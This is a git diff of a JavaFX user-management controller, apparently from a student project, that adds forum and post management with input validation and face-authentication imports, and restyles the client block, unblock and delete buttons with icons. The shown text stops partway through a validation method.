@@ -1,12 +1,14 @@
 package com.wolfs.controllers.user;
 
+import com.github.sarxos.webcam.Webcam;
+import com.github.sarxos.webcam.WebcamResolution;
 import com.google.api.client.auth.oauth2.Credential;
 import com.google.api.services.oauth2.model.Userinfo;
 import com.wolfs.models.*;
 import com.wolfs.services.*;
+import com.wolfs.utils.FaceAuthenticator;
 import com.wolfs.utils.GoogleAuthUtil;
 import javafx.animation.*;
-
 import javafx.application.Platform;
 import javafx.beans.property.SimpleStringProperty;
 import javafx.collections.FXCollections;
@@ -21,21 +23,30 @@ import javafx.scene.control.Dialog;
 import javafx.scene.control.Label;
 import javafx.scene.control.TextField;
 import javafx.scene.control.cell.PropertyValueFactory;
+import javafx.scene.control.cell.TextFieldTableCell;
 import javafx.scene.image.Image;
 import javafx.scene.image.ImageView;
+import javafx.scene.input.KeyCode;
 import javafx.scene.input.MouseEvent;
 import javafx.scene.layout.AnchorPane;
 import javafx.scene.layout.GridPane;
 import javafx.scene.layout.HBox;
+import javafx.scene.layout.VBox;
 import javafx.scene.paint.Color;
 import javafx.scene.shape.Circle;
 import javafx.scene.text.Text;
 import javafx.stage.FileChooser;
+import javafx.util.Callback;
 import javafx.util.Duration;
 import javafx.event.ActionEvent;
 import javafx.util.StringConverter;
+import javafx.util.converter.BooleanStringConverter;
+import javafx.util.converter.IntegerStringConverter;
+
 import org.mindrot.jbcrypt.BCrypt;
 
+import javax.imageio.ImageIO;
+import java.awt.image.BufferedImage;
 import java.io.File;
 import java.io.IOException;
 import java.security.SecureRandom;
@@ -45,12 +56,252 @@ import java.time.LocalDateTime;
 import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
 import java.time.format.DateTimeParseException;
-import java.util.List;
-import java.util.Optional;
+import java.util.*;
+import java.util.concurrent.CompletableFuture;
 
 
 public class CrudUser {
+    private final FaceAuthenticator authenticator = new FaceAuthenticator();
+    private final String pythonScriptPath = "C:/Users/Dhib/Desktop/face_id_test/login.py";
+    private final String dbPath = "C:/Users/Dhib/Desktop/face_id_test/face_db";
+    @FXML
+    private Label statusLabel;
 
+    @FXML
+    private TextField nameField;
+    @FXML
+    private TextField createdByField;
+    @FXML
+    private TextField descriptionField;
+    @FXML
+    private CheckBox isPrivateCheckBox;
+    @FXML
+    private Button addForumButton;
+
+    @FXML
+    private ListView<String> membersListView;
+    @FXML
+    private TextField memberEmailField;
+    @FXML
+    private Button addMemberButton;
+
+    @FXML
+    private TableView<Forum> forumTableView;
+
+    @FXML
+    private TableColumn<Forum, Integer> forumIdColumn;
+    @FXML
+    private TableColumn<Forum, String> nameColumn;
+    @FXML
+    private TableColumn<Forum, String> createdByColumn;
+    @FXML
+    private TableColumn<Forum, Integer> postCountColumn;
+    @FXML
+    private TableColumn<Forum, String> membersColumn;
+    @FXML
+    private TableColumn<Forum, String> descriptionColumn;
+    @FXML
+    private TableColumn<Forum, LocalDateTime> dateColumn;
+    @FXML
+    private TableColumn<Forum, Boolean> privateColumn;
+
+    private ObservableList<Forum> forumList = FXCollections.observableArrayList();
+
+    @FXML
+    private Label nameErrorLabel;
+    @FXML
+    private Label emailErrorLabel;
+    @FXML
+    private Label descriptionErrorLabel;
+    @FXML
+    private Label memberEmailErrorLabel;
+
+    private boolean isNameValid = false;
+    private boolean isEmailValid = false;
+    private boolean isDescriptionValid = false;
+    private boolean isMemberEmailValid = false;
+
+    private ForumService forumService = new ForumService();
+
+
+//******************
+
+    public ScrollPane postsContainer;
+    @FXML
+    private ComboBox<Forum> forumComboBox;
+    @FXML
+    private VBox postsVBox;
+    @FXML
+    private VBox commentsSection;
+    @FXML
+    private Button backButton;
+    @FXML
+    private TextArea forumDescription;
+    @FXML
+    private Label forumPrivacyLabel;
+    @FXML
+    private Label forumDateLabel;
+    @FXML
+    private Label memberCountLabel;
+    @FXML
+    private ListView<String> membersListViewFP;
+    @FXML
+    private VBox membersSection;
+    @FXML
+    private ComboBox<String> postTypeComboBox;
+    @FXML
+    private VBox announcementFields;
+    @FXML
+    private VBox surveyFields;
+    @FXML
+    private TextField announcementTitleField;
+    @FXML
+    private TextArea announcementContentField;
+    @FXML
+    private TextField announcementTagsField;
+    @FXML
+    private TextField surveyQuestionField;
+    @FXML
+    private TextField surveyTagsField;
+    @FXML
+    private TextArea newCommentField;
+    @FXML
+    private VBox commentsVBox;
+
+    @FXML
+    private Label titleErrorLabel;
+    @FXML
+    private Label contentErrorLabel;
+    @FXML
+    private Label tagsErrorLabel;
+    @FXML
+    private Label questionErrorLabel;
+    @FXML
+    private Label surveyTagsErrorLabel;
+    @FXML
+    private Label commentErrorLabel;
+    @FXML
+    private Label choiceErrorLabel;
+
+    @FXML
+    private TabPane leftTabPane;
+
+    @FXML
+    private VBox postDetailsBox;
+
+    @FXML
+    private TextField choiceField;
+    @FXML
+    private Button addChoiceButton;
+    @FXML
+    private ListView<String> choicesListView;
+
+    @FXML
+    private TextField announcementFileField;
+    @FXML
+    private TextField surveyFileField;
+    @FXML
+    private ComboBox<String> announcementStatusComboBox;
+    @FXML
+    private ComboBox<String> surveyStatusComboBox;
+    @FXML
+    private TextField surveyUserField;
+    @FXML
+    private Button addSurveyUserButton;
+    @FXML
+    private ListView<String> surveyUsersListView;
+    @FXML
+    private Label surveyUserErrorLabel;
+    @FXML
+    private Label announcementFileErrorLabel;
+    @FXML
+    private Label surveyFileErrorLabel;
+
+    @FXML
+    private TextField editChoiceField;
+    @FXML
+    private Button editAddChoiceButton;
+    @FXML
+    private ListView<String> editChoicesListView;
+
+    @FXML
+    private TextField editSurveyQuestionField;
+    @FXML
+    private TextField editSurveyTagsField;
+    @FXML
+    private TextField editSurveyFileField;
+    @FXML
+    private ComboBox<String> editSurveyStatusComboBox;
+    @FXML
+    private TextField editSurveyUserField;
+    @FXML
+    private Button editAddSurveyUserButton;
+    @FXML
+    private ListView<String> editSurveyUsersListView;
+    @FXML
+    private Label editSurveyUserErrorLabel;
+    @FXML
+    private Label editChoiceErrorLabel;
+
+    @FXML
+    private TextField editAnnouncementTitleField;
+    @FXML
+    private TextArea editAnnouncementContentField;
+    @FXML
+    private TextField editAnnouncementTagsField;
+    @FXML
+    private TextField editAnnouncementFileField;
+    @FXML
+    private ComboBox<String> editAnnouncementStatusComboBox;
+    @FXML
+    private VBox editAnnouncementFields;
+    @FXML
+    private VBox editSurveyFields;
+
+    @FXML
+    private Label editTitleErrorLabel;
+    @FXML
+    private Label editContentErrorLabel;
+    @FXML
+    private Label editSurveyQuestionErrorLabel;
+
+    @FXML
+    private TextField announcementUserField;
+    @FXML
+    private TextField surveyAuthorField;
+    @FXML
+    private TextField editAnnouncementUserField;
+    @FXML
+    private TextField editSurveyAuthorField;
+    @FXML
+    private Label announcementUserErrorLabel;
+    @FXML
+    private Label surveyAuthorErrorLabel;
+    @FXML
+    private Label editAnnouncementUserErrorLabel;
+    @FXML
+    private Label editSurveyAuthorErrorLabel;
+
+    @FXML
+    private Button addPostButton;
+
+    @FXML
+    private Label editTagsErrorLabel;
+    @FXML
+    private Label editSurveyTagsErrorLabel;
+
+    private ForumService forumServiceFP = new ForumService();
+    private PostService postService = new PostService();
+    private ChoixService choixService = new ChoixService();
+
+    private Post currentPost;
+    //NewNajdForumI
+    private Map<String, Long> userLastPostTime = new HashMap<>(); // Store user's last post time
+    private static final long POST_COOLDOWN = 60000; // 1 minute cooldown in milliseconds
+    @FXML
+    private TabPane rightTabPane;
+
+    //finNAJD
 
     @FXML
     private Label nonBloquer_label;
@@ -1552,40 +1803,43 @@ private TableView<Vol> tableViewVols;
         });
         cl_user_bloquer.setCellFactory(column -> {
             return new TableCell<Client, Void>() {
-                private final Button btn = new Button("Bloquer");
-
+                private final Button btn = new Button();
+                private final ImageView imageView = new ImageView(new Image("/images/bloquer.png")); // Chemin de l'image
+                private final HBox hbox = new HBox(btn);
 
                 {
-                    HBox hbox = new HBox(btn);
+                    // Configuration de l'image
+                    imageView.setFitWidth(40);
+                    imageView.setFitHeight(40);
+
+                    btn.setGraphic(imageView);
+
                     hbox.setAlignment(Pos.CENTER);
                     setGraphic(hbox);
+
                     btn.setStyle(
-                            "-fx-background-color: #E78D1E; " +
+                            "-fx-background-color:transparent; " +
                                     "-fx-text-fill: white; " +
                                     "-fx-font-size: 14px; " +
                                     "-fx-border-radius: 5px; " +
                                     "-fx-cursor: hand;"
                     );
 
-
                     btn.setOnAction(event -> {
-                        Client Cl = getTableView().getItems().get(getIndex());
+                        Client client = getTableView().getItems().get(getIndex());
 
                         Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
                         alert.setTitle("Confirmation de Bloquer");
-                        alert.setHeaderText("Voulez-vous vraiment vous Bloquer  ? " + Cl.getName() + " " + Cl.getPrenom());
+                        alert.setHeaderText("Voulez-vous vraiment bloquer " + client.getName() + " " + client.getPrenom() + " ?");
                         alert.setContentText("Cliquez sur OK pour confirmer.");
 
                         Optional<ButtonType> result = alert.showAndWait();
 
                         if (result.isPresent() && result.get() == ButtonType.OK) {
-                            ClientServices CL1 = new ClientServices();
-                            CL1.bloquer_client(CL1.getUserIdByEmail(Cl.getEmail()));
+                            ClientServices clientServices = new ClientServices();
+                            clientServices.bloquer_client(clientServices.getUserIdByEmail(client.getEmail()));
                             RefreshTableView_User();
-
                         }
-
-
                     });
                 }
 
@@ -1595,52 +1849,50 @@ private TableView<Vol> tableViewVols;
                     if (empty) {
                         setGraphic(null);
                     } else {
-                        setGraphic(btn);
-                        HBox hbox = new HBox(btn);
-                        hbox.setAlignment(Pos.CENTER);
                         setGraphic(hbox);
                     }
                 }
             };
         });
-
 
         cl_user_debloquer.setCellFactory(column -> {
             return new TableCell<Client, Void>() {
-                private final Button btn = new Button("Debloquer");
-
+                private final Button btn = new Button();
+                private final ImageView imageView = new ImageView(new Image("/images/debloque.png")); // Chemin de l'image
+                private final HBox hbox = new HBox(btn);
 
                 {
-                    HBox hbox = new HBox(btn);
+                    imageView.setFitWidth(40);
+                    imageView.setFitHeight(40);
+
+                    btn.setGraphic(imageView);
+
                     hbox.setAlignment(Pos.CENTER);
                     setGraphic(hbox);
+
                     btn.setStyle(
-                            "-fx-background-color: #E78D1E; " +
+                            "-fx-background-color: transparent; " +
                                     "-fx-text-fill: white; " +
                                     "-fx-font-size: 14px; " +
                                     "-fx-border-radius: 5px; " +
                                     "-fx-cursor: hand;"
                     );
 
-
                     btn.setOnAction(event -> {
-                        Client Cl = getTableView().getItems().get(getIndex());
+                        Client client = getTableView().getItems().get(getIndex());
 
                         Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
-                        alert.setTitle("Confirmation de debloquer");
-                        alert.setHeaderText("Voulez-vous vraiment vous debloquer  ? " + Cl.getName() + " " + Cl.getPrenom());
+                        alert.setTitle("Confirmation de Débloquer");
+                        alert.setHeaderText("Voulez-vous vraiment débloquer " + client.getName() + " " + client.getPrenom() + " ?");
                         alert.setContentText("Cliquez sur OK pour confirmer.");
 
                         Optional<ButtonType> result = alert.showAndWait();
 
                         if (result.isPresent() && result.get() == ButtonType.OK) {
-                            ClientServices CL1 = new ClientServices();
-                            CL1.debloquer_client(CL1.getUserIdByEmail(Cl.getEmail()));
+                            ClientServices clientServices = new ClientServices();
+                            clientServices.debloquer_client(clientServices.getUserIdByEmail(client.getEmail()));
                             RefreshTableView_User();
-
                         }
-
-
                     });
                 }
 
@@ -1650,51 +1902,53 @@ private TableView<Vol> tableViewVols;
                     if (empty) {
                         setGraphic(null);
                     } else {
-                        setGraphic(btn);
-                        HBox hbox = new HBox(btn);
-                        hbox.setAlignment(Pos.CENTER);
                         setGraphic(hbox);
                     }
                 }
             };
         });
-
         cl_user_supprimer.setCellFactory(column -> {
             return new TableCell<Client, Void>() {
-                private final Button btn = new Button("Supprimer");
-
+                private final Button btn = new Button();
+                private final ImageView imageView = new ImageView(new Image("/images/supprimer.png"));
+                private final HBox hbox = new HBox(btn);
 
                 {
-                    HBox hbox = new HBox(btn);
+                    imageView.setFitWidth(40);
+                    imageView.setFitHeight(40);
+
+                    btn.setGraphic(imageView);
+
                     hbox.setAlignment(Pos.CENTER);
                     setGraphic(hbox);
+
                     btn.setStyle(
-                            "-fx-background-color: #E78D1E; " +
+                            "-fx-background-color: transparent; " +
                                     "-fx-text-fill: white; " +
                                     "-fx-font-size: 14px; " +
                                     "-fx-border-radius: 5px; " +
                                     "-fx-cursor: hand;"
                     );
 
-
+                    // Gestion de l'action du bouton
                     btn.setOnAction(event -> {
-                        Client Cl = getTableView().getItems().get(getIndex());
+                        Client client = getTableView().getItems().get(getIndex());
 
                         Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
                         alert.setTitle("Confirmation de Suppression");
-                        alert.setHeaderText("Voulez-vous vraiment vous supprimer  ? " + Cl.getName() + " " + Cl.getPrenom());
+                        alert.setHeaderText("Voulez-vous vraiment supprimer " + client.getName() + " " + client.getPrenom() + " ?");
                         alert.setContentText("Cliquez sur OK pour confirmer.");
 
                         Optional<ButtonType> result = alert.showAndWait();
 
                         if (result.isPresent() && result.get() == ButtonType.OK) {
-                            ClientServices ClientService = new ClientServices();
-                            Client C1 = new Client(ClientService.getUserIdByEmail(Cl.getEmail()), "", "", "", "", 0, 0, 0, "");
-                            ClientService.supprimerUser(C1);
+                            ClientServices clientServices = new ClientServices();
+                            Client clientToDelete = new Client(
+                                    clientServices.getUserIdByEmail(client.getEmail()), "", "", "", "", 0, 0, 0, ""
+                            );
+                            clientServices.supprimerUser(clientToDelete);
                             RefreshTableView_User();
                         }
-
-
                     });
                 }
 
@@ -1704,15 +1958,11 @@ private TableView<Vol> tableViewVols;
                     if (empty) {
                         setGraphic(null);
                     } else {
-                        setGraphic(btn);
-                        HBox hbox = new HBox(btn);
-                        hbox.setAlignment(Pos.CENTER);
                         setGraphic(hbox);
                     }
                 }
             };
         });
-
 
         ClientServices ClS = new ClientServices();
         List<Client> ClientList = ClS.rechercherUser();
@@ -1948,6 +2198,212 @@ private TableView<Vol> tableViewVols;
         refreshTable();
         //NEWWWW
         refreshData();
+        //new
+        { //najdForumI
+            //--------------------------------------------------------------------------------------------------------
+            {
+                forumTableView.setEditable(true);
+
+                forumIdColumn.setCellValueFactory(new PropertyValueFactory<>("forumId"));
+
+                nameColumn.setCellValueFactory(new PropertyValueFactory<>("name"));
+                nameColumn.setCellFactory(TextFieldTableCell.forTableColumn());
+                nameColumn.setOnEditCommit(this::onNameEdit);
+
+                createdByColumn.setCellValueFactory(cellData -> {
+                    int userId = cellData.getValue().getCreatedBy();
+                    String email = forumService.getEmailById(userId);
+                    return new SimpleStringProperty(email);
+                });
+                createdByColumn.setCellFactory(TextFieldTableCell.forTableColumn());
+                createdByColumn.setOnEditCommit(event -> {
+                    Forum forum = event.getRowValue();
+                    if (validateTableEdit(forum, "createdBy", event.getNewValue())) {
+                        int userId = forumService.getUserByEmail(event.getNewValue());
+                        forum.setCreatedBy(userId);
+                        updateForum(forum);
+                    }
+                });
+
+                postCountColumn.setCellValueFactory(new PropertyValueFactory<>("postCount"));
+                postCountColumn.setCellFactory(TextFieldTableCell.forTableColumn(new IntegerStringConverter()));
+                postCountColumn.setOnEditCommit(this::onPostCountEdit);
+
+                membersColumn.setCellValueFactory(cellData -> {
+                    Forum forum = cellData.getValue();
+                    if (!forum.isPrivate()) {
+                        return new SimpleStringProperty("Public Forum");
+                    }
+                    String members = forum.getListMembers();
+                    if (members == null || members.isEmpty()) {
+                        return new SimpleStringProperty("No members");
+                    }
+                    return new SimpleStringProperty(members.replace(",", "\n"));
+                });
+                membersColumn.setCellFactory(tc -> {
+                    TableCell<Forum, String> cell = new TableCell<>() {
+                        private final Text text = new Text();
+
+                        {
+                            setGraphic(text);
+                            setPrefHeight(Control.USE_COMPUTED_SIZE);
+                            text.wrappingWidthProperty().bind(widthProperty());
+                        }
+
+                        @Override
+                        protected void updateItem(String item, boolean empty) {
+                            super.updateItem(item, empty);
+                            text.setText(empty ? null : item);
+                        }
+                    };
+                    return cell;
+                });
+                membersColumn.setEditable(false);
+
+                descriptionColumn.setCellValueFactory(new PropertyValueFactory<>("description"));
+                descriptionColumn.setCellFactory(TextFieldTableCell.forTableColumn());
+                descriptionColumn.setOnEditCommit(this::onDescriptionEdit);
+
+                dateColumn.setCellValueFactory(new PropertyValueFactory<>("dateCreation"));
+
+                privateColumn.setCellValueFactory(new PropertyValueFactory<>("private"));
+                privateColumn.setCellFactory(TextFieldTableCell.forTableColumn(new BooleanStringConverter()));
+                privateColumn.setOnEditCommit(event -> {
+                    Forum forum = event.getRowValue();
+                    forum.setPrivate(event.getNewValue());
+                    if (!event.getNewValue()) {
+                        forum.setListMembers("");
+                        forum.setNbrMembers(0);
+                    }
+                    updateForum(forum);
+                });
+
+                addButtonsToTable();
+
+                refreshTableFB();
+
+                addForumButton.setOnAction(event -> addForum());
+                isPrivateCheckBox.setOnAction(event -> handlePrivateCheckbox());
+                addMemberButton.setOnAction(event -> addMember());
+
+                nameField.textProperty().addListener((observable, oldValue, newValue) -> validateName(newValue));
+                createdByField.textProperty().addListener((observable, oldValue, newValue) -> validateEmail(newValue));
+                descriptionField.textProperty().addListener((observable, oldValue, newValue) -> validateDescription(newValue));
+                memberEmailField.textProperty().addListener((observable, oldValue, newValue) -> validateMemberEmail(newValue));
+
+                nameErrorLabel.setVisible(false);
+                emailErrorLabel.setVisible(false);
+                descriptionErrorLabel.setVisible(false);
+                memberEmailErrorLabel.setVisible(false);
+            }
+
+            {
+                postTypeComboBox.getItems().addAll("Announcement", "Survey");
+                postTypeComboBox.setOnAction(e -> handlePostTypeChange());
+
+                loadForums();
+
+                forumComboBox.setOnAction(e -> updateForumInfo());
+
+                setupValidationListeners();
+
+                refreshPosts();
+
+
+                choiceField.textProperty().addListener((obs, old, newValue) ->
+                        validateChoice(newValue));
+
+                announcementStatusComboBox.setValue("active");
+                surveyStatusComboBox.setValue("active");
+
+                surveyUserField.textProperty().addListener((obs, old, newValue) ->
+                        validateSurveyUser(newValue));
+
+                editChoiceField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditChoice(newValue));
+                editSurveyUserField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditSurveyUser(newValue));
+                editAnnouncementTitleField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditTitle(newValue));
+                editAnnouncementContentField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditContent(newValue));
+                editSurveyQuestionField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditQuestion(newValue));
+
+                editChoicesListView.setOnContextMenuRequested(e -> {
+                    if (editChoicesListView.getSelectionModel().getSelectedItem() != null) {
+                        ContextMenu menu = new ContextMenu();
+                        MenuItem removeItem = new MenuItem("Remove");
+                        removeItem.setOnAction(event ->
+                                editChoicesListView.getItems().remove(
+                                        editChoicesListView.getSelectionModel().getSelectedItem()
+                                )
+                        );
+                        menu.getItems().add(removeItem);
+                        menu.show(editChoicesListView, e.getScreenX(), e.getScreenY());
+                    }
+                });
+
+                editSurveyUsersListView.setOnContextMenuRequested(e -> {
+                    if (editSurveyUsersListView.getSelectionModel().getSelectedItem() != null) {
+                        ContextMenu menu = new ContextMenu();
+                        MenuItem removeItem = new MenuItem("Remove");
+                        removeItem.setOnAction(event ->
+                                editSurveyUsersListView.getItems().remove(
+                                        editSurveyUsersListView.getSelectionModel().getSelectedItem()
+                                )
+                        );
+                        menu.getItems().add(removeItem);
+                        menu.show(editSurveyUsersListView, e.getScreenX(), e.getScreenY());
+                    }
+                });
+
+                announcementUserField.textProperty().addListener((obs, old, newValue) ->
+                        validateUserEmail(announcementUserField, announcementUserErrorLabel, newValue));
+                surveyAuthorField.textProperty().addListener((obs, old, newValue) ->
+                        validateUserEmail(surveyAuthorField, surveyAuthorErrorLabel, newValue));
+                editAnnouncementUserField.textProperty().addListener((obs, old, newValue) ->
+                        validateUserEmail(editAnnouncementUserField, editAnnouncementUserErrorLabel, newValue));
+                editSurveyAuthorField.textProperty().addListener((obs, old, newValue) ->
+                        validateUserEmail(editSurveyAuthorField, editSurveyAuthorErrorLabel, newValue));
+
+
+                forumComboBox.valueProperty().addListener((obs, oldVal, newVal) -> {
+                    addPostButton.setDisable(newVal == null);
+                });
+
+                announcementTagsField.textProperty().addListener((obs, old, newValue) ->
+                        validateTags(newValue, tagsErrorLabel));
+
+                surveyTagsField.textProperty().addListener((obs, old, newValue) ->
+                        validateTags(newValue, surveyTagsErrorLabel));
+
+                editAnnouncementTagsField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditTags(newValue, editTagsErrorLabel));
+
+                editSurveyTagsField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditTags(newValue, editSurveyTagsErrorLabel));
+
+                List<TextInputControl> fields = Arrays.asList(
+                        announcementTitleField, announcementContentField, announcementTagsField,
+                        surveyQuestionField, surveyTagsField, choiceField, surveyUserField,
+                        editAnnouncementTitleField, editAnnouncementContentField, editAnnouncementTagsField,
+                        editSurveyQuestionField, editSurveyTagsField, editChoiceField, editSurveyUserField
+                );
+
+                for (TextInputControl field : fields) {
+                    field.focusedProperty().addListener((obs, wasFocused, isNowFocused) -> {
+                        if (!isNowFocused && !field.getStyleClass().contains("valid-fieldFP")
+                                && !field.getStyleClass().contains("text-field-errorFP")) {
+                            field.getStyleClass().add("text-field-errorFP");
+                        }
+                    });
+                }
+            }
+
+            //--------------------------------------------------------------------------------------------------------
+        }
+
 
 
     }
@@ -4227,6 +4683,2073 @@ private TableView<Vol> tableViewVols;
 
         timeline.play();
     }
+
+    //--------------------------------NajdForumF------------------------------------------------------------------------
+    @FXML
+    private void handlePrivateCheckbox() {
+        boolean isPrivate = isPrivateCheckBox.isSelected();
+        membersListView.setDisable(!isPrivate);
+        memberEmailField.setDisable(!isPrivate);
+
+        if (!isPrivate) {
+            membersListView.getItems().clear();
+            updateMemberCount();
+        }
+    }
+
+    @FXML
+    private void addMember() {
+        String email = memberEmailField.getText().trim();
+        if (!email.isEmpty() && !membersListView.getItems().contains(email)) {
+            if (forumService.getUserByEmail(email) != -1) {
+                membersListView.getItems().add(email);
+                memberEmailField.clear();
+                hideError(memberEmailField, memberEmailErrorLabel);
+                isMemberEmailValid = true;
+
+                updateMemberCount();
+            }
+        }
+    }
+
+    private void addButtonsToTable() {
+        TableColumn<Forum, Void> actionsCol = new TableColumn<>("Actions");
+
+        Callback<TableColumn<Forum, Void>, TableCell<Forum, Void>> cellFactory = new Callback<>() {
+            @Override
+            public TableCell<Forum, Void> call(final TableColumn<Forum, Void> param) {
+                return new TableCell<>() {
+                    private final Button deleteButton = new Button("Delete");
+                    private final HBox buttons = new HBox(5, deleteButton);
+
+                    {
+                        deleteButton.setOnAction(event -> {
+                            Forum forum = getTableView().getItems().get(getIndex());
+                            handleDelete(forum);
+                        });
+
+                        buttons.setAlignment(javafx.geometry.Pos.CENTER);
+                    }
+
+                    @Override
+                    protected void updateItem(Void item, boolean empty) {
+                        super.updateItem(item, empty);
+                        if (empty) {
+                            setGraphic(null);
+                        } else {
+                            setGraphic(buttons);
+                        }
+                    }
+                };
+            }
+        };
+
+        actionsCol.setCellFactory(cellFactory);
+        forumTableView.getColumns().add(actionsCol);
+    }
+
+    private void handleDelete(Forum forum) {
+        forumService.supprimer(forum);
+        refreshTableFB();
+    }
+
+    private void refreshTableFB() {
+        forumList.clear();
+        forumList.addAll(forumService.rechercher());
+        forumTableView.setItems(forumList);
+    }
+
+    private void onNameEdit(TableColumn.CellEditEvent<Forum, String> event) {
+        Forum forum = event.getRowValue();
+        if (validateTableEdit(forum, "name", event.getNewValue())) {
+            forum.setName(event.getNewValue());
+            updateForum(forum);
+        }
+    }
+
+    private void onPostCountEdit(TableColumn.CellEditEvent<Forum, Integer> event) {
+        Forum forum = event.getRowValue();
+        forum.setPostCount(event.getNewValue());
+        updateForum(forum);
+    }
+
+    private void onDescriptionEdit(TableColumn.CellEditEvent<Forum, String> event) {
+        Forum forum = event.getRowValue();
+        if (validateTableEdit(forum, "description", event.getNewValue())) {
+            forum.setDescription(event.getNewValue());
+            updateForum(forum);
+        }
+    }
+
+    private void updateForum(Forum forum) {
+        forumService.modifier(forum);
+        refreshTableFB();
+    }
+
+    private void validateName(String name) {
+        if (name.isEmpty()) {
+            showError(nameField, nameErrorLabel, "Le nom ne peut pas être vide");
+            isNameValid = false;
+        } else if (name.length() > 20) {
+            showError(nameField, nameErrorLabel, "Le nom ne doit pas dépasser 20 caractères");
+            isNameValid = false;
+        } else if (!name.matches("[a-zA-Z ]+")) {
+            showError(nameField, nameErrorLabel, "Le nom ne doit contenir que des lettres et des espaces");
+            isNameValid = false;
+        } else {
+            hideError(nameField, nameErrorLabel);
+            isNameValid = true;
+        }
+    }
+
+    private void validateEmail(String email) {
+        if (email.isEmpty()) {
+            showError(createdByField, emailErrorLabel, "L'email ne peut pas être vide");
+            isEmailValid = false;
+        } else if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
+            showError(createdByField, emailErrorLabel, "Format d'email invalide");
+            isEmailValid = false;
+        } else if (forumService.getUserByEmail(email) == -1) {
+            showError(createdByField, emailErrorLabel, "Cet utilisateur n'existe pas");
+            isEmailValid = false;
+        } else {
+            hideError(createdByField, emailErrorLabel);
+            isEmailValid = true;
+        }
+    }
+
+    private void validateDescription(String description) {
+        if (description.isEmpty()) {
+            showError(descriptionField, descriptionErrorLabel, "La description ne peut pas être vide");
+            isDescriptionValid = false;
+        } else if (description.length() > 100) {
+            showError(descriptionField, descriptionErrorLabel, "La description ne doit pas dépasser 100 caractères");
+            isDescriptionValid = false;
+        } else {
+            hideError(descriptionField, descriptionErrorLabel);
+            isDescriptionValid = true;
+        }
+    }
+
+    private void validateMemberEmail(String email) {
+        addMemberButton.setDisable(true);
+
+        if (email.isEmpty()) {
+            showError(memberEmailField, memberEmailErrorLabel, "L'email ne peut pas être vide");
+            isMemberEmailValid = false;
+        } else if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
+            showError(memberEmailField, memberEmailErrorLabel, "Format d'email invalide");
+            isMemberEmailValid = false;
+        } else if (forumService.getUserByEmail(email) == -1) {
+            showError(memberEmailField, memberEmailErrorLabel, "Cet utilisateur n'existe pas");
+            isMemberEmailValid = false;
+        } else {
+            hideError(memberEmailField, memberEmailErrorLabel);
+            isMemberEmailValid = true;
+            addMemberButton.setDisable(false);
+        }
+    }
+
+    private void showError(TextField field, Label errorLabel, String message) {
+        field.getStyleClass().clear();
+        field.getStyleClass().addAll("text-field", "text-field-error");
+        errorLabel.setText(message);
+        errorLabel.setVisible(true);
+    }
+
+    private void hideError(TextField field, Label errorLabel) {
+        field.getStyleClass().clear();
+        field.getStyleClass().addAll("text-field", "valid-field");
+        errorLabel.setVisible(false);
+    }
+
+    @FXML
+    private void clearFieldsFP() {
+
+        nameField.clear();
+        createdByField.clear();
+        descriptionField.clear();
+        memberEmailField.clear();
+
+        nameErrorLabel.setText("");
+        emailErrorLabel.setText("");
+        descriptionErrorLabel.setText("");
+        memberEmailErrorLabel.setText("");
+
+        membersListView.getItems().clear();
+
+        isPrivateCheckBox.setSelected(false);
+
+        isNameValid = false;
+        isEmailValid = false;
+        isDescriptionValid = false;
+    }
+
+    @FXML
+    private void addForum() {
+        validateName(nameField.getText());
+        validateEmail(createdByField.getText());
+        validateDescription(descriptionField.getText());
+
+        if (!isNameValid || !isEmailValid || !isDescriptionValid) {
+            Alert alert = new Alert(Alert.AlertType.ERROR);
+            alert.setTitle("Erreur de validation");
+            alert.setHeaderText("Veuillez corriger les erreurs suivantes:");
+
+            StringBuilder content = new StringBuilder();
+            if (!isNameValid) content.append("- Erreur dans le nom du forum\n");
+            if (!isEmailValid) content.append("- Erreur dans l'email du créateur\n");
+            if (!isDescriptionValid) content.append("- Erreur dans la description\n");
+
+            alert.setContentText(content.toString());
+            alert.showAndWait();
+            return;
+        }
+
+        String name = nameField.getText();
+        String createdBy = createdByField.getText();
+        String description = descriptionField.getText();
+        boolean isPrivate = isPrivateCheckBox.isSelected();
+
+        String listMembers = isPrivate ? String.join(",", membersListView.getItems()) : "";
+
+        Forum forum = new Forum();
+        forum.setName(name);
+        forum.setDescription(description);
+        forum.setDateCreation(LocalDateTime.now());
+        forum.setPrivate(isPrivate);
+        forum.setListMembers(listMembers);
+        forum.setCreatedBy(forumService.getUserByEmail(createdBy));
+
+        forum.setNbrMembers(membersListView.getItems().size());
+
+        forumService.ajouter(forum);
+
+        refreshTableFB();
+        clearFieldsFP();
+        refreshPosts2();
+
+        Alert successAlert = new Alert(Alert.AlertType.INFORMATION);
+        successAlert.setTitle("Succès");
+        successAlert.setHeaderText("Forum ajouté avec succès");
+        successAlert.setContentText("Le forum a été ajouté à la base de données.");
+        successAlert.showAndWait();
+    }
+
+    private boolean validateTableEdit(Forum forum, String field, String newValue) {
+        StringBuilder errors = new StringBuilder();
+        boolean isValid = true;
+
+        switch (field) {
+            case "name":
+                if (newValue.isEmpty()) {
+                    errors.append("- Le nom ne peut pas être vide\n");
+                    isValid = false;
+                }
+                if (newValue.length() > 20) {
+                    errors.append("- Le nom ne doit pas dépasser 20 caractères\n");
+                    isValid = false;
+                }
+                if (!newValue.matches("[a-zA-Z ]+")) {
+                    errors.append("- Le nom ne doit contenir que des lettres et des espaces\n");
+                    isValid = false;
+                }
+                break;
+
+            case "createdBy":
+                if (newValue.isEmpty()) {
+                    errors.append("- L'email ne peut pas être vide\n");
+                    isValid = false;
+                } else if (!newValue.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
+                    errors.append("- Format d'email invalide\n");
+                    isValid = false;
+                } else if (forumService.getUserByEmail(newValue) == -1) {
+                    errors.append("- Cet utilisateur n'existe pas\n");
+                    isValid = false;
+                }
+                break;
+
+            case "description":
+                if (newValue.isEmpty()) {
